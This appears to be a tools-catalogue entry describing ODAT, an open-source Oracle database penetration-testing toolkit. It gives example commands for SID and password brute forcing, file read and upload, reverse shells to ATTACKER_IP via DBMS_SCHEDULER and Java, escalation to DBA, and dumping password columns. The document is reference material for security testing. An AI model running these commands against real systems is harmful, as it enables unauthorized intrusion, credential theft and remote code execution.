---
name: "odat"
categories:
  - database
homepage: "https://github.com/quentinhardy/odat"
origin: "hacktricks"
recipe: "upstream"
packaged-by: []
build-system: python
github-repo: "quentinhardy/odat"
github-stars: 1785
github-match: "exact"
gh-checked: "2026-11-13"
worth: 6.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-13"
license: "custom:unknown"
---

# odat

> Oracle Database Attacking Tool: a modular Python toolkit for finding SIDs and credentials on remote Oracle databases and abusing authenticated access to read files, execute OS commands and escalate to DBA.

## What it's for

ODAT (Oracle Database Attacking Tool, by Quentin Hardy) is an open-source penetration-testing tool for Oracle databases, tested against 10g through 19c. Unauthenticated, it discovers valid SIDs (dictionary or brute force via `sidguesser`), valid service names (`servicenameguesser`) and guesses account credentials (`passwordguesser`, `passwords` for hash extraction). Authenticated with any valid account, its modules abuse Oracle PL/SQL packages for post-exploitation: file read/write/delete (`utlfile`, `dbmsxslprocessor`, `dbmsadvisor`, `dbmslob`, `ctxsys`, `externaltable`), OS command execution and reverse shells (`dbmsscheduler`, `java`, `externaltable`, `oradbg`), privilege escalation to DBA via five system-privilege combinations (`privesc`), HTTP requests and port scans from the database server (`utlhttp`, `httpuritype`, `utltcp`), SMB-authentication capture (`smb`), TNS poisoning (CVE-2012-1675), CVE exploits (CVE-2012-3137, CVE-2014-4237, CVE-2018-3004), plus a `search` module that hunts and dumps columns matching password patterns and a minimal SQL shell. The `all` module chains the unauthenticated discovery steps and reports what each found account can do. It is Linux-only, Python 3, and needs Oracle Instant Client + cx_Oracle for the development version; a pyinstaller standalone exists. For raw TNS listener packet work see the sibling tool [[tnscmd10g]].

No corpus evidence — derived from upstream documentation (README plus the upstream wiki and the packaged source's own argument parser).

## Typical use cases

### Run the full attack sweep against a listener

The first command to run when only host and port are known.

```
./odat.py all -s target.example.com -p 1521
```

Outcome: searches valid SIDs (wordlist plus small brute force by default), then guesses accounts on each SID found, then for every valid credential reports which modules that user can use (reverse shell, file read, DBA escalation...) — a complete capability map of the instance in one run; `--sids-max-size`/`--sid-charset` tune brute force, `-l hosts.txt` or `--nmap-file out.xml` sweep multiple targets.

### Sweep with a known SID and credentials

Skip discovery when you already hold access.

```
./odat.py all -s target.example.com -p 1521 -d ORCL -U SYS -P password
```

Outcome: ODAT does not search for other SIDs and goes straight to enumerating what the given account can do on the ORCL instance; add `--sysdba`/`--sysoper` to connect as SYSDBA/SYSOPER, or `-C` to pull credentials from the accounts file instead of `-U`/`-P`.

### Guess valid SIDs with a wordlist

Enumerate instance names when `all` is too noisy.

```
./odat.py sidguesser -s target.example.com -p 1521 --sids-file=./sids.txt
```

Outcome: tries each SID in the file against the listener and prints the ones it accepts; listener ALIASES are also tried as SIDs unless `--no-alias-like-sid` is set (`snguesser` does the same for service names via `--service-name-file`).

### Guess Oracle credentials

Test default and leaked account/password pairs.

```
./odat.py passwordguesser -s target.example.com -p 1521 -d ORCL --accounts-files accounts/logins.txt accounts/pwds.txt --login-as-pwd
```

Outcome: tries every login/password combination from the two files against the ORCL instance (the default `--accounts-file` ships one password per account to avoid lockouts), also testing each login as its own password in both cases via `--login-as-pwd`, and prints the working combinations; use `--sleep 0.2` if the listener starts throwing ORA-12519 from too many connections.

### Download a file from the database server

Read OS files through a valid account.

```
./odat.py utlfile -s target.example.com -p 1521 -d ORCL -U user -P password --getFile /tmp/ notes.txt notes.txt
```

Outcome: uses UTL_FILE to read `/tmp/notes.txt` from the database host and store it locally as `notes.txt` (arguments are remote path, remote file, local file); `--putFile /tmp/ shell.sh shell.sh` uploads a file and `--removeFile /tmp/ shell.sh` deletes it — `--test-module` first checks the package is callable by this user.

### Get a reverse shell via DBMS_SCHEDULER

Execute OS commands with the oracle account, no separate listener needed.

```
./odat.py dbmsscheduler -s target.example.com -p 1521 -d ORCL -U user -P password --reverse-shell ATTACKER_IP 4444
```

Outcome: on Linux targets schedules a python one-liner callback, on Windows targets it transparently stands up a minimal HTTP server, makes the database host download a PowerShell script and run it — an interactive shell arrives at the given IP:port, which the module opens itself; `--exec 'command'` runs a single command instead (output is not returned), and `--cmd-exe` wraps it in `cmd.exe /c` for Windows.

### Get a shell through the Oracle Java VM

The alternative execution path when DBMS_SCHEDULER is unavailable.

```
./odat.py java -s target.example.com -p 1521 -d ORCL -U user -P password --shell
```

Outcome: an interactive shell on the database host running through Java-stored procedures; `--path-shell /bin/bash` selects the shell binary, `--reverse-shell ATTACKER_IP 4444` gets a connect-back instead, and `--create-file-CVE-2018-3004` writes arbitrary files bypassing the built-in Oracle JVM security.

### Escalate a low-privileged account to DBA

Turn system privileges into SYS-level access.

```
./odat.py privesc -s target.example.com -p 1521 -d ORCL -U user -P password --exec-with-execute-any-procedure 'GRANT dba TO user'
```

Outcome: with CREATE PROCEDURE + EXECUTE ANY PROCEDURE privileges, runs the given SQL statement as SYS — here granting the DBA role to the current user; other routes are `--dba-with-create-any-trigger`, `--dba-with-analyze-any`, `--dba-with-create-any-index` and `--alter-pwd-with-create-any-procedure user new-password`, `--get-privs`/`--get-detailed-privs` first show what the account holds and `--revoke-dba-role` undoes the grant.

### Hunt and dump password-like columns

Find credentials inside the schema once logged in.

```
./odat.py search -s target.example.com -p 1521 -d ORCL -U user -P password --pwd-column-names
```

Outcome: searches all accessible tables' column names for password patterns and prints matching tables with an example value; `--dump OWNER.USERS:USERNAME,PASSWORD --dump-file loot` exports table data to CSV/XLSX, `--desc-tables` lists non-system tables, and `--sql-shell` opens a minimal interactive SELECT shell for ad-hoc queries.
